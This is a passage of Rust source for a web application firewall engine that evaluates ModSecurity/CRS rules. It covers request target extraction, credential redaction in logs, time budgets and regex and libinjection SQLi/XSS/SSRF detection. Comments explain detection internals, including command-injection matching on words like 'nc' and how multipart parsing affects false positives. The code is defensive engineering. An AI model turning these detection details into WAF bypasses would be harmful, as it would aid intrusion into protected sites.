        // `body_args`, which dispatches on the same header. Keeping one source
        // of that decision means the two cannot disagree about whether a body
        // was JSON.
        TargetSpec::ReqbodyProcessor => {
            let ct = views.content_type(ctx);
            let processor = if ct.starts_with("application/json") || ct.contains("+json") {
                "JSON"
            } else if is_xml_content_type(ct) {
                "XML"
            } else if ct.starts_with("multipart/form-data") {
                "MULTIPART"
            } else if ct.starts_with("application/x-www-form-urlencoded") {
                "URLENCODED"
            } else {
                // ModSecurity leaves it unset when no processor ran. Returning a
                // single empty string rather than an empty vec matters: an empty
                // vec makes the operator return `Absent` and the rule cannot
                // evaluate, so `!@streq JSON` would never fire on a bodiless
                // request — which is precisely when CRS 920540 wants it to.
                ""
            };
            vec![processor.to_owned()]
        }
        // For multipart/form-data, yield the PARSED part values rather than the
        // raw envelope. ModSecurity/CRS deliberately leave REQUEST_BODY empty for
        // multipart — the parts reach ARGS instead — and handing rules the raw
        // envelope makes the envelope's own structure look like an attack: the
        // `\r\n\r\n` separating a part's headers from its value satisfies the
        // newline operator in command-injection patterns, so any field whose value
        // begins with a command word false-positives. Measured: a multipart field
        // holding the ordinary text `nc 8000 controller` was blocked by 9900207,
        // while the identical value in a urlencoded form passed.
        //
        // No coverage is lost. The part values are still inspected — that is what
        // this returns — and scanning them individually is strictly better for
        // wholly-encoded payloads, which only decode once separated from the
        // boundary noise.
        TargetSpec::RequestBody => {
            if views.content_type(ctx).starts_with("multipart/form-data") {
                views.multipart(ctx)?.fields.values.to_vec()
            } else {
                views.whole_body(ctx)?;
                ctx.request_body
                    .as_ref()
                    .map(|b| vec![String::from_utf8_lossy(b).into_owned()])
                    .unwrap_or_default()
            }
        }
        TargetSpec::RequestHeadersAll => ctx
            .request_headers
            .values()
            .map(|v| header_text(v).into_owned())
            .collect(),
        TargetSpec::RequestHeader(name) => request_header_values(ctx, name),
        // Cookie NAMES. Session-fixation and cookie-injection rules match on the
        // name side, so returning values here would silently never fire them.
        TargetSpec::RequestCookiesNames => {
            views.cookies(ctx).iter().map(|(k, _)| k.clone()).collect()
        }
        // Header NAMES. HeaderMap keys are already lowercased by hyper, which
        // matches CRS expectations — its header-name patterns are written
        // case-insensitively.
        TargetSpec::RequestHeadersNames => ctx
            .request_headers
            .keys()
            .map(|k| k.as_str().to_owned())
            .collect(),
        // ARGS_GET is the query string ONLY. Deliberately not `Args`: a rule
        // written for the query side would otherwise also score body parameters,
        // which is how a query-only restriction turns into a false positive on a
        // legitimate POST.
        TargetSpec::ArgsGet => views.query(ctx)?.values.to_vec(),
        TargetSpec::ArgsGetNames => views.query(ctx)?.names.to_vec(),
        // The raw, still-encoded query string. CRS uses this for rules that must
        // see the encoding itself — double-encoding and separator abuse — so it
        // must NOT be decoded here.
        TargetSpec::QueryString => vec![ctx.uri.query().unwrap_or("").to_owned()],
        TargetSpec::RequestCookiesAll => {
            views.cookies(ctx).iter().map(|(_, v)| v.clone()).collect()
        }
        TargetSpec::RequestCookie(name) => views
            .cookies(ctx)
            .iter()
            .filter(|(k, _)| k == name)
            .map(|(_, v)| v.clone())
            .collect(),
        TargetSpec::ResponseHeadersAll => ctx
            .response_headers
            .as_ref()
            .map(|h| h.values().map(|v| header_text(v).into_owned()).collect())
            .unwrap_or_default(),
        TargetSpec::ResponseHeader(name) => ctx
            .response_headers
            .as_ref()
            .map(|h| {
                h.get_all(name.as_str())
                    .iter()
                    .map(|v| header_text(v).into_owned())
                    .collect()
            })
            .unwrap_or_default(),
        TargetSpec::ResponseBody => ctx
            .response_body
            .as_ref()
            .map(|b| vec![String::from_utf8_lossy(b).into_owned()])
            .unwrap_or_default(),
        TargetSpec::MultipartPartHeadersAll => views
            .multipart(ctx)?
            .part_headers
            .iter()
            .map(|(_, line)| line.clone())
            .collect(),
        // Selecting by PART name, not header name — see the importer note. Used
        // as `&MULTIPART_PART_HEADERS:_charset_`, where a non-zero count means
        // the request carried a `_charset_` form field.
        TargetSpec::MultipartPartHeader(part) => views
            .multipart(ctx)?
            .part_headers
            .iter()
            .filter(|(n, _)| n.eq_ignore_ascii_case(part))
            .map(|(_, line)| line.clone())
            .collect(),
        TargetSpec::Files => views.multipart(ctx)?.filenames.clone(),
        TargetSpec::FilesNames => views.multipart(ctx)?.field_names.clone(),
        TargetSpec::FilesCombinedSize => vec![views.multipart(ctx)?.combined_size.to_string()],
        TargetSpec::ArgsCombinedSize => {
            // ModSecurity counts BOTH sides of every argument: the name and the
            // value. Counting values alone would under-report a request that
            // smuggles its payload into parameter names, which is exactly the
            // shape 920390 exists to bound.
            let total: usize = views
                .query(ctx)?
                .iter()
                .chain(views.body(ctx)?.iter())
                .map(|(k, v)| k.len() + v.len())
                .sum();
            vec![total.to_string()]
        }
        TargetSpec::RemoteAddr => vec![ctx.client_ip.to_string()],
        TargetSpec::Geo => vec![], // TODO: GeoIP in Phase 2
        TargetSpec::TxVar(name) => ctx
            .tx_vars
            .get(name)
            .map(|v| vec![v.clone()])
            .unwrap_or_default(),
        TargetSpec::CountOf(inner) => {
            let count = match inner.as_ref() {
                TargetSpec::RequestHeader(name) => {
                    ctx.request_headers.get_all(name.as_str()).iter().count()
                }
                TargetSpec::ResponseHeader(name) => ctx
                    .response_headers
                    .as_ref()
                    .map(|h| h.get_all(name.as_str()).iter().count())
                    .unwrap_or(0),
                other => views.count(other, ctx, last_matched)?,
            };
            vec![count.to_string()]
        }
    })
}

// ---------------------------------------------------------------------------
// Severity mapping
// ---------------------------------------------------------------------------

fn map_severity(s: RuleSeverity) -> Severity {
    match s {
        RuleSeverity::Critical => Severity::Critical,
        RuleSeverity::High => Severity::High,
        RuleSeverity::Medium => Severity::Medium,
        RuleSeverity::Low => Severity::Low,
        RuleSeverity::Notice => Severity::Notice,
    }
}

/// Re-exported so this module reads naturally; the list itself lives in
/// `sentinel-core` because the proxy's access-log redaction must use exactly the
/// same one. Two lists that must agree are a list that will drift — and the gap
/// between them was a real leak (cookies were covered by neither).
use sentinel_core::redact::is_sensitive_field_name;

/// The values of every sensitively-named field in this request.
///
/// Collected ONCE per `evaluate` call (per phase) and cached by the caller, on
/// the first fired rule that captured anything. It reads the query and body
/// through `views`, so it adds no parse of its own; only the sensitive values
/// are copied. The list is normally empty, and short when it is not.
fn collect_sensitive_values(ctx: &RequestContext, views: &RequestViews) -> Vec<String> {
    // Cookies and headers were MISSING here, and that was the hole. CRS 942100
    // (SQLi via libinjection) is multi-target and includes REQUEST_COOKIES, and
    // a multi-target rule leaves `RuleMatch.target` empty — so the proxy's
    // second, target-based redaction pass could not catch it either. A session
    // JWT that tripped libinjection was therefore written verbatim to waf.log,
    // to ClickHouse under a 90-day TTL, and out to the SIEM.
    let mut sensitive = Vec::new();
    // A side the engine could not list — too complex, or past the site's
    // argument limits — has fields no one knows the names of, so its whole
    // text stands in for them. Over-redacting what could not be taken apart
    // is the safe side of not knowing.
    let query = views.query(ctx).ok();
    if let (None, Some(q)) = (query, ctx.uri.query()) {
        sensitive.push(q.to_owned());
        sensitive.push(percent_decode(&q.replace('+', " ")));
    }
    match views.body(ctx) {
        Ok(body) => {
            // Judged once per listed name: a shared name can carry thousands
            // of values, and the check lowercases it each time.
            let verdicts: Vec<bool> = body
                .names
                .iter()
                .map(|name| is_sensitive_field_name(name))
                .collect();
            sensitive.extend(
                body.values
                    .iter()
                    .enumerate()
                    .filter(|(i, value)| !value.is_empty() && verdicts[body.listed(*i)])
                    .map(|(_, value)| value.clone()),
            );
        }
        Err(_) => {
            if let Some(b) = ctx.request_body.as_ref() {
                sensitive.push(String::from_utf8_lossy(b).into_owned());
            }
        }
    }

    // Cookies are not collected here: EVERY cookie value is withheld at capture
    // (see `withheld_cookie_value`), whatever its name. Judging them by name let
    // an Express session called `node-js` through, and reading only the first
    // Cookie field missed every cookie after it on HTTP/2 and HTTP/3.

    // Header values, keyed by header name — Authorization, X-Api-Key and
    // friends. Cheap: a request carries a few dozen headers at most, and this
    // runs once per phase, not once per rule.
    sensitive.extend(
        query
            .into_iter()
            .flat_map(Params::iter)
            .filter(|(name, value)| !value.is_empty() && is_sensitive_field_name(name))
            .map(|(_, value)| value.to_owned()),
    );
    sensitive.extend(
        ctx.request_headers
            .iter()
            // `Cookie` is skipped: its values are handled, one cookie at a time,
            // by `withheld_cookie_value`, which also catches a rule matching the
            // WHOLE header (the match text carries each value).
            .filter(|(name, _)| !name.as_str().eq_ignore_ascii_case("cookie"))
            // Decoded as the rules read it, so a value they can now match is
            // also one capture withholds.
            .filter(|(name, value)| !value.is_empty() && is_sensitive_field_name(name.as_str()))
            .map(|(_, value)| header_text(value).into_owned()),
    );
    sensitive
}

/// True when `value` is the value of a sensitively-named request field.
///
/// A rule firing on a password field is usually a FALSE POSITIVE — real
/// passwords contain quotes, `OR`, and SQL keywords — and capturing the payload
/// there would write a live credential into the log an operator then pastes
/// into a ticket. The target label cannot answer this: CRS rules are
/// multi-target and `TargetSpec::Args` labels as bare `ARGS`, never
/// `ARGS:password`. So the request's own fields are consulted instead, and the
/// check happens at capture time — the value never reaches `RuleMatch`, so no
/// downstream consumer can leak what it never received.
fn value_is_sensitive(sensitive_values: &[String], value: &str) -> bool {
    if value.is_empty() {
        return false;
    }
    sensitive_values.iter().any(|field_value| {
        // An exact match is a credential at any length: the operator matched
        // this field's whole value.
        if field_value == value {
            return true;
        }
        // Substring matching in EITHER direction, because a transform may have
        // trimmed or decoded the value before the operator saw it — but only
        // for a field value long enough to identify one specific secret.
        //
        // Without this floor the check is catastrophic in the FALSE-POSITIVE
        // direction. Sensitive fields are now collected from every cookie and
        // header, and short ones are commonplace: `X-Auth-Version: 1`,
        // `authed=1`, `otp=123456`. A one-character field value makes
        // `value.contains("1")` true for nearly every attack payload, and the
        // log silently degrades to `[redacted]` on every line — losing exactly
        // the forensic detail this capture exists to provide. Redacting too
        // much is not the safe direction; it is a different failure.
        const MIN_IDENTIFYING_LEN: usize = 8;
        field_value.len() >= MIN_IDENTIFYING_LEN
            && (field_value.contains(value) || value.contains(field_value.as_str()))
    })
}

/// Cap and sanitize a matched value for retention on the `RuleMatch`.
///
/// 256 chars is enough to judge a false positive (the CRS's own `logdata`
/// convention truncates similarly); control characters are stripped so a
/// payload cannot smuggle newlines/ANSI into an NDJSON line or a terminal.
/// Truncation walks back to a char boundary — a payload is untrusted input
/// and a mid-codepoint slice would panic.
fn cap_matched(s: &str) -> String {
    const MAX: usize = 256;
    let cleaned: String = s
        .chars()
        .map(|c| if c.is_control() { ' ' } else { c })
        .collect();
    if cleaned.len() <= MAX {
        return cleaned;
    }
    let mut end = MAX;
    while end > 0 && !cleaned.is_char_boundary(end) {
        end -= 1;
    }
    format!("{}…", &cleaned[..end])
}

/// Record the text a match instruction matched, for the rule being evaluated.
///
/// Only ever records a HIT — that is the whole point. A single rule commonly
/// inspects several targets (CRS 942100 is
/// `ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_HEADERS|XML:/*`) and the compiler
/// emits one match instruction per target. Assigning the result directly meant a
/// later target that did NOT match overwrote the value an earlier one DID match
/// with `None`, so multi-target rules — most of CRS — routinely recorded an
/// empty payload on a real detection.
///
/// The LAST genuine hit wins, which matters for `chain`. A chain is an AND of
/// several links, and CRS writes the cheap precondition first and the real
/// detection last:
///
/// ```text
/// SecRule REQUEST_FILENAME "@rx /admin" "chain"
///   SecRule ARGS "@detectSQLi"
/// ```
///
/// Keeping the first hit records `/admin` — true, and useless. The operator
/// needs the payload from the link that actually detected something.
///
/// `last_matched` is cleared at every `RuleEnd`, so a value can never be
/// attributed to a later rule.
fn record_match<S: AsRef<str>>(last_matched: &mut Option<String>, hit: Option<S>) {
    if let Some(v) = hit {
        *last_matched = Some(cap_matched(v.as_ref()));
    }
}

// ---------------------------------------------------------------------------
// VM evaluator
// ---------------------------------------------------------------------------

/// How many instructions run between two reads of the clock for the site's
/// time budget while the values in hand are small. Reading it costs tens of
/// nanoseconds and such an instruction at least that, so the check adds
/// little.
const CLOCK_EVERY: u32 = 64;

/// After a target loads at least this many bytes of values, the clock is read
/// before every instruction until the next load. One transform chain or
/// operator over large values can take longer than `CLOCK_EVERY` cheap
/// instructions — about 0.4 s over 10 MiB — so reading it only every
/// `CLOCK_EVERY` let a budget be overrun by a dozen such rules; and a read is
/// nothing beside the work on 64 KiB. A budget is overrun by at most one
/// instruction, or `CLOCK_EVERY` cheap ones.
const CLOCK_BYTES: usize = 64 * 1024;

/// Whether `values` hold at least `bytes` bytes between them; counts no
/// further.
fn holds_at_least(values: &[String], bytes: usize) -> bool {
    let mut held = 0;
    values.iter().any(|v| {
        held += v.len();
        held >= bytes
    })
}

/// The wall clock the time budget watches.
#[cfg(not(any(test, feature = "test-hooks")))]
fn eval_clock() -> std::time::Instant {
    std::time::Instant::now()
}

#[cfg(any(test, feature = "test-hooks"))]
fn eval_clock() -> std::time::Instant {
    std::time::Instant::now() + crate::test_hooks::eval_clock_skew()
}

/// The CPU time this thread has used, where the platform keeps it.
#[cfg(target_os = "linux")]
fn thread_cpu_time() -> Option<std::time::Duration> {
    let mut ts = libc::timespec {
        tv_sec: 0,
        tv_nsec: 0,
    };
    // SAFETY: `clock_gettime` writes one `timespec` through the pointer, which
    // points at a live, writable one.
    let rc = unsafe { libc::clock_gettime(libc::CLOCK_THREAD_CPUTIME_ID, &mut ts) };
    (rc == 0).then(|| std::time::Duration::new(ts.tv_sec as u64, ts.tv_nsec as u32))
}

#[cfg(not(target_os = "linux"))]
fn thread_cpu_time() -> Option<std::time::Duration> {
    None
}

/// The CPU clock the time budget is measured in.
#[cfg(not(any(test, feature = "test-hooks")))]
fn eval_cpu_clock() -> Option<std::time::Duration> {
    thread_cpu_time()
}

#[cfg(any(test, feature = "test-hooks"))]
fn eval_cpu_clock() -> Option<std::time::Duration> {
    thread_cpu_time().map(|t| t + crate::test_hooks::eval_cpu_clock_skew())
}

/// The site's time budget (`inspection_time_budget_ms`) for one `evaluate`
/// call: one phase of one request.
///
/// It is CPU time this thread spends evaluating, which is the request's own
/// cost: `evaluate` never yields, so the thread runs nothing else until it
/// returns. Wall time also counted time the thread spent descheduled — a busy
/// node, which is what a flood makes — so a heavy but legitimate request
/// could be refused for the load around it. Where there is no thread CPU
/// clock, wall time is all there is.
///
/// Per phase, not per request: the request headers are bounded by the proxy's
/// header limits, the response by what the origin sends, so the phase a
/// client can make expensive is the request body; and a budget spent across
/// phases would let a costly request body refuse the response that follows.
struct TimeBudget {
    budget: std::time::Duration,
    wall_started: std::time::Instant,
    cpu_started: Option<std::time::Duration>,
    /// How much wall time passes before the CPU clock is worth reading. A
    /// thread uses no more CPU time than wall time passes, so until then the
    /// budget cannot be spent; and the CPU clock is a system call, the wall
    /// clock is not.
    cpu_unread_for: std::time::Duration,
}

impl TimeBudget {
    /// The budget `limits` set, from now; `None` for none.
    fn start(limits: &InspectionLimits) -> Option<Self> {
        (limits.time_budget_ms > 0).then(|| {
            let budget = std::time::Duration::from_millis(limits.time_budget_ms.into());
            Self {
                budget,
                wall_started: eval_clock(),
                cpu_started: eval_cpu_clock(),
                cpu_unread_for: budget,
            }
        })
    }

    /// Once the budget is spent, the CPU time this call has used and the wall
    /// time it has taken.
    fn spent(&mut self) -> Option<(std::time::Duration, std::time::Duration)> {
        let wall = eval_clock().saturating_duration_since(self.wall_started);
        if wall <= self.cpu_unread_for {
            return None;
        }
        let cpu = match (self.cpu_started, eval_cpu_clock()) {
            (Some(started), Some(now)) => now.saturating_sub(started),
            _ => wall,
        };
        if cpu > self.budget {
            return Some((cpu, wall));
        }
        // Descheduled for the difference: the CPU clock cannot pass the
        // budget before the wall clock moves on by what is left of it.
        self.cpu_unread_for = wall + (self.budget - cpu);
        None
    }
}

/// What a request past `limit` is refused for, in words.
fn over_limit_detail(limits: &InspectionLimits, limit: InspectionLimit) -> String {
    match limit {
        InspectionLimit::Args => format!(
            "more than {} arguments ({})",
            limits.max_args,
            limit.setting()
        ),
        InspectionLimit::ArgBytes => format!(
            "more than {} bytes of argument names and values ({})",
            limits.max_arg_bytes,
            limit.setting()
        ),
        InspectionLimit::Time => format!(
            "rule evaluation passed the {} ms time budget ({})",
            limits.time_budget_ms,
            limit.setting()
        ),
    }
}

/// Refuse a request the engine cannot inspect within the site's limits.
///
/// Stopping early and returning what was found so far would pass the rest
/// uninspected, so the request is blocked instead, with the reason and a
/// built-in CRITICAL match under the limit's own rule id. In learning mode the
/// proxy downgrades the block to a logged would-block, as it does every verdict.
/// An argument limit answers 413, or 414 when the query string alone is over
/// it, as the proxy's size limits do; the time budget answers 403.
///
/// `more` is added to the reason only: the match's message stays the same for
/// every request refused for one setting, as the event's attack name.
fn refuse_uninspected(
    ctx: &mut RequestContext,
    views: &RequestViews,
    phase: Phase,
    limit: InspectionLimit,
    more: Option<String>,
) -> WafDecision {
    let detail = over_limit_detail(&ctx.inspection_limits, limit);
    // Once per request: in learning mode the next phase can meet the same
    // limit again, and one request is one event.
    if !ctx
        .rule_matches
        .iter()
        .any(|m| m.rule_id == limit.rule_id())
    {
        sentinel_telemetry::note_inspection_limit_exceeded(limit.reason());
        ctx.rule_matches.push(RuleMatch {
            rule_id: limit.rule_id().to_string(),
            message: format!("Request not fully inspected: {detail}"),
            severity: Severity::Critical,
            // The refusal decides the verdict itself; it adds no score.
            score: 0,
            // About the request as a whole: there is no one field to name, and
            // a target is what an operator would write an exclusion against.
            target: String::new(),
            phase: phase.clone(),
            matched_value: String::new(),
        });
    }
    if limit != InspectionLimit::Time && !is_response_phase(&phase) {
        ctx.block_status = Some(if views.query(ctx).is_err() { 414 } else { 413 });
    }
    ctx.decision = WafDecision::Block;
    ctx.block_reason = Some(match more {
        Some(more) => format!("inspection limit exceeded: {detail}; {more}"),
        None => format!("inspection limit exceeded: {detail}"),
    });
    WafDecision::Block
}

/// Execute the instruction program for `phase` against `ctx`.
///
/// Returns the final `WafDecision` (may update `ctx.decision` and
/// `ctx.rule_matches` internally).
pub fn evaluate(
    ruleset: &CompiledRuleSet,
    ctx: &mut RequestContext,
    phase: Phase,
    anomaly_threshold: u32,
) -> WafDecision {
    let response_phase = is_response_phase(&phase);
    let phase_idx = phase.clone() as usize;
    let program = &ruleset.phase_programs[phase_idx];

    // Parsed request collections, built once and shared by every rule for the
    // rest of this call — and dropped with it. See `RequestViews`.
    let views = RequestViews::new(&ruleset.memo_uses[phase_idx]);
    let mut stack: Vec<StackVal> = Vec::with_capacity(16);
    let mut ip: usize = 0; // instruction pointer
                           // Per-rule target attribution, reset at every RuleEnd. The spec,
                           // not its label: the label is only formatted for a rule that fires.
    let mut last_target: Option<&TargetSpec> = None;
    let mut targets_seen = 0usize;
    // Sensitive field values for credential redaction, computed at most once per
    // phase on the first fired rule that captured anything — see
    // `collect_sensitive_values`. Stays `None` for the overwhelmingly common
    // case of a request where no rule fires at all.
    let mut sensitive_values: Option<Vec<String>> = None;
    // Every cookie value (raw and decoded), for `withheld_cookie_value`. Built
    // lazily like `sensitive_values`.
    let mut cookie_values: Option<Vec<String>> = None;
    // The text the most recent Match* instruction of the CURRENT rule matched,
    // reset at every RuleEnd alongside the target attribution. Every match
    // instruction that can name its text writes here (Some on hit, None on
    // miss), so a stale value from an earlier rule can never be attributed to
    // a later one.
    let mut last_matched: Option<String> = None;
    // The site's time budget for this call; see `TimeBudget`. Its clock is
    // read every `CLOCK_EVERY` instructions, and before every instruction
    // while `large_values` — the last target loaded `CLOCK_BYTES` or more.
    let mut time_budget = TimeBudget::start(&ctx.inspection_limits);
    let mut steps: u32 = 0;
    let mut large_values = false;

    while ip < program.len() {
        // Early exit only on a real BLOCK — the same rule as the proxy's
        // `still_evaluating`. This read `!= Allow`, and `Log` is not `Allow`:
        // once learning mode had downgraded a verdict to Log (an over-long URI,
        // or the request's own anomaly verdict), every later call returned at
        // its first instruction. The proxy's phase-1 fix let the rule engine be
        // CALLED after a Log, but the engine then ran nothing; and on a
        // learning-mode site the response rules never ran for any request that
        // had already scored — the attack traffic most likely to leak.
        // Challenge and Limit are not refusals either. (Code review finding.)
        if ctx.decision == WafDecision::Block {
            return ctx.decision.clone();
        }

        // After the Block exit, not before it: a rule that blocked decided the
        // request, and a budget found spent at the next instruction overwrote
        // its verdict with a time refusal — whose advice, raise the budget,
        // would change nothing. (Review finding.)
        steps = steps.wrapping_add(1);
        if let Some(budget) = time_budget
            .as_mut()
            .filter(|_| large_values || steps % CLOCK_EVERY == 0)
        {
            if let Some((cpu, wall)) = budget.spent() {
                let after = format!(
                    "stopped after {} ms of CPU time ({} ms elapsed)",
                    cpu.as_millis(),
                    wall.as_millis()
                );
                return refuse_uninspected(ctx, &views, phase, InspectionLimit::Time, Some(after));
            }
        }

        let instr = &program[ip];
        match instr {
            Instruction::LoadTarget(spec) => {
                // Track which part of the request this rule looked at, so a
                // security event can name the parameter an operator would exclude.
                //
                // Counted, not merely remembered: a rule that evaluates SEVERAL
                // targets (chains, `ARGS|REQUEST_HEADERS`) offers no way to tell
                // from here WHICH one the operator matched, and naming the wrong
                // parameter would send someone to write an exclusion against a
                // target that never fired. So the label is kept only when the rule
                // inspected exactly one target, and left empty otherwise.
                targets_seen += 1;
                last_target = Some(spec);
                // The compiler emits a target's transform chain right after
                // it. For a memoizable target, take the transformed values
                // from the memo and step over the ApplyTransforms. multiMatch
                // keeps every intermediate step and is left to run in full.
                // `memo_uses` counts the pairs on this same pattern.
                let memo_chain = match program.get(ip + 1) {
                    Some(Instruction::ApplyTransforms {
                        transforms,
                        multi_match: false,
                    }) if memo_policy(spec) != Memo::Never => Some(transforms),
                    _ => None,
                };
                let loaded = match memo_chain {
                    Some(transforms) => views.load_transformed(spec, transforms, ctx),
                    None => views.load(spec, ctx, last_matched.as_deref()),
                };
                let values = match loaded {
                    Ok(values) => values,
                    // A body that cannot be listed is refused, not inspected
                    // as empty: an empty list would pass it uninspected. In
                    // learning mode the proxy turns this into a logged
                    // would-block, like any other verdict.
                    Err(Unlisted::BodyTooComplex) => {
                        ctx.decision = WafDecision::Block;
                        ctx.block_reason = Some(BODY_TOO_COMPLEX.to_string());
                        return WafDecision::Block;
                    }
                    // Past the site's argument limits: the arguments were not
                    // all parsed, so no ARGS-family rule can judge them.
                    Err(Unlisted::OverLimit(limit)) => {
                        return refuse_uninspected(ctx, &views, phase, limit, None);
                    }
                    // A parsed body too long to read whole: what the rules
                    // reading it whole would have judged is unknown.
                    Err(Unlisted::WholeBodyOverLimit(len)) => {
                        let allowed = ctx
                            .inspection_limits
                            .max_arg_bytes
                            .saturating_mul(WHOLE_BODY_FACTOR);
                        let more = format!(
                            "read whole, the body is {len} bytes, more than the {allowed} its \
                             encoding and markup may take"
                        );
                        return refuse_uninspected(
                            ctx,
                            &views,
                            phase,
                            InspectionLimit::ArgBytes,
                            Some(more),
                        );
                    }
                };
                large_values = holds_at_least(&values, CLOCK_BYTES);
                stack.push(StackVal::Strings(values));
                if memo_chain.is_some() {
                    ip += 2;
                    continue;
                }
            }

            Instruction::MatchRx { pattern_id } => {
                let values = pop_strings(&mut stack);
                if values.is_empty() {
                    stack.push(StackVal::Absent);
                } else {
                    let regex = &ruleset.patterns[*pattern_id];
                    // Regex capture groups populate TX.0 (whole match) and
                    // TX.1..TX.9 (groups), which is what a CHAINED condition
                    // reads: `SecRule TX:1 "!@rx ..."`.
                    //
                    // Without this, every capture-then-chain rule was inert —
                    // not false-positive, silently inert, because TX:1 yielded
                    // no values and a target with no values cannot match even
                    // when the condition is negated. 14 shipped rules across
                    // 922 (multipart), 942 (SQLi), 932 (RCE), 933 (PHP), 920
                    // (protocol) and 943 (session fixation) are built this way.
                    //
                    // Deviation from ModSecurity, deliberate: it populates these
                    // only for rules carrying the `capture` action, whereas this
                    // populates whenever the pattern HAS groups. The importer
                    // treats `capture` as a no-op, and threading the flag through
                    // the AST, compiler and instruction set would change nothing
                    // observable — no shipped rule writes a bare `tx.<digit>`
                    // (checked: the only digit-ish names are `tx.922100_charset`
                    // and friends), and nothing reads TX:N unless it captured.
                    // It also makes `logdata:'%{TX.0}'` report the text that
                    // actually matched instead of an empty string.
                    let matched = if regex.captures_len() > 1 {
                        let mut hit = false;
                        for s in values.iter() {
                            if let Some(caps) = regex.captures(s) {
                                for (i, g) in caps.iter().enumerate().take(10) {
                                    if let Some(m) = g {
                                        ctx.tx_vars.insert(i.to_string(), m.as_str().to_owned());
                                    }
                                }
                                record_match(&mut last_matched, caps.get(0).map(|m| m.as_str()));
                                hit = true;
                                break; // first match wins, as ModSecurity does
                            }
                        }
                        hit
                    } else {
                        // `find` instead of `is_match` so the matched text can be
                        // named on the eventual security event; same lazy-DFA
                        // path, and it still stops at the first matching value.
                        let mut hit = false;
                        for s in values.iter() {
                            if let Some(m) = regex.find(s) {
                                record_match(&mut last_matched, Some(m.as_str()));
                                hit = true;
                                break;
                            }
                        }
                        hit
                    };
                    debug!(pattern = %regex.as_str(), matched, "MatchRx");
                    stack.push(StackVal::Bool(matched));
                }
            }

            Instruction::MatchMulti { set_id } => {
                let values = pop_strings(&mut stack);
                if values.is_empty() {
                    stack.push(StackVal::Absent);
                } else {
                    let ac = &ruleset.ac_sets[*set_id];
                    // The AC set cannot cheaply name WHICH pattern hit, but the
                    // value that contained it is what an operator needs to see.
                    let hit_value = values.iter().find(|s| ac.is_match(s));
                    let matched = hit_value.is_some();
                    record_match(&mut last_matched, hit_value);
                    debug!(set_id, matched, "MatchMulti");
                    stack.push(StackVal::Bool(matched));
                }
            }

            Instruction::MatchInterpolated { cmp, raw_id } => {
                let values = pop_strings(&mut stack);
                let raw = &ruleset.literals[*raw_id];
                match expand_operator_macros(raw, ctx) {
                    // A macro we cannot resolve makes the comparison meaningless.
                    // Push Absent, NOT Bool(false): `Not(Absent)` is false, so a
                    // negated policy check (`!@within %{tx.allowed_methods}`)
                    // degrades to "did not fire" instead of "deny everything".
                    None => {
                        debug!(raw = %raw, "MatchInterpolated: unresolved macro — absent");
                        stack.push(StackVal::Absent);
                    }
                    Some(pat) if values.is_empty() => {
                        let _ = pat;
                        stack.push(StackVal::Absent);
                    }
                    Some(pat) => {
                        // `None` here means "cannot be decided", and is pushed as
                        // Absent for the same reason as an unresolved macro.
                        let verdict: Option<bool> = match cmp {
                            InterpCmp::Streq => Some(values.iter().any(|v| *v == pat)),
                            // ModSecurity @within: the VALUE sits inside the
                            // pattern. CRS depends on this with pipe-delimited
                            // lists like `|utf-8| |iso-8859-1|`.
                            InterpCmp::Within => {
                                Some(values.iter().any(|v| pat.contains(v.as_str())))
                            }
                            InterpCmp::EndsWith => Some(values.iter().any(|v| v.ends_with(&pat))),
                            // A non-numeric bound is undecidable, NOT zero.
                            // Treating it as 0 would make `@gt %{tx.max_num_args}`
                            // fire on any request carrying a single argument.
                            InterpCmp::Ge | InterpCmp::Gt | InterpCmp::Lt => {
                                pat.trim().parse::<f64>().ok().map(|bound| {
                                    values.iter().any(|v| {
                                        v.trim().parse::<f64>().is_ok_and(|n| match cmp {
                                            InterpCmp::Ge => n >= bound,
                                            InterpCmp::Gt => n > bound,
                                            _ => n < bound,
                                        })
                                    })
                                })
                            }
                        };
                        match verdict {
                            Some(matched) => {
                                debug!(pat = %pat, matched, "MatchInterpolated");
                                stack.push(StackVal::Bool(matched));
                            }
                            None => {
                                debug!(pat = %pat, "MatchInterpolated: undecidable bound — absent");
                                stack.push(StackVal::Absent);
                            }
                        }
                    }
                }
            }

            Instruction::MatchEq { literal_id } => {
                let values = pop_strings(&mut stack);
                if values.is_empty() {
                    stack.push(StackVal::Absent);
                } else {
                    let literal = &ruleset.literals[*literal_id];
                    let hit = values.iter().find(|s| *s == literal);
                    let matched = hit.is_some();
                    record_match(&mut last_matched, hit);
                    stack.push(StackVal::Bool(matched));
                }
            }

            Instruction::Exists => {
                let values = pop_strings(&mut stack);
                let exists = !values.is_empty() && values.iter().any(|s| !s.is_empty());
                stack.push(StackVal::Bool(exists));
            }

            // The libinjection operators below name the whole offending VALUE
            // rather than a substring — libinjection reports a verdict, not a
            // span. These two back rules 942100 and 941100, the most-fired
            // rules in the product, so leaving them uninstrumented would have
            // left payload capture blind exactly where it matters most.
            Instruction::DetectSqli => {
                let values = pop_strings(&mut stack);
                if values.is_empty() {
                    stack.push(StackVal::Absent);
                } else {
                    let hit = values
                        .iter()
                        .find(|s| libinjectionrs::detect_sqli(s.as_bytes()).is_injection());
                    let matched = hit.is_some();
                    record_match(&mut last_matched, hit);
                    debug!(matched, "DetectSqli");
                    stack.push(StackVal::Bool(matched));
                }
            }

            Instruction::DetectXss => {
                let values = pop_strings(&mut stack);
                if values.is_empty() {
                    stack.push(StackVal::Absent);
                } else {
                    let hit = values
                        .iter()
                        .find(|s| libinjectionrs::detect_xss(s.as_bytes()).is_injection());
                    let matched = hit.is_some();
                    record_match(&mut last_matched, hit);
                    debug!(matched, "DetectXss");
                    stack.push(StackVal::Bool(matched));
                }
            }

            Instruction::DetectOffDomainUrl => {
                let values = pop_strings(&mut stack);
                if values.is_empty() {
                    stack.push(StackVal::Absent);
                } else {
                    let host = views.host(ctx);
                    let hit = values.iter().find(|v| contains_off_domain_url(v, host));
                    let matched = hit.is_some();
                    record_match(&mut last_matched, hit);
                    debug!(matched, "DetectOffDomainUrl");
                    stack.push(StackVal::Bool(matched));
                }
            }

            Instruction::DetectSsrfUrl => {
                let values = pop_strings(&mut stack);
                if values.is_empty() {
                    stack.push(StackVal::Absent);
                } else {
                    let hit = values.iter().find(|v| crate::ssrf::contains_ssrf_url(v));
                    let matched = hit.is_some();
                    record_match(&mut last_matched, hit);
                    debug!(matched, "DetectSsrfUrl");
                    stack.push(StackVal::Bool(matched));
                }
            }

            Instruction::IpMatch { cidrs } => {
                let values = pop_strings(&mut stack);
                if values.is_empty() {
                    stack.push(StackVal::Absent);
                } else {
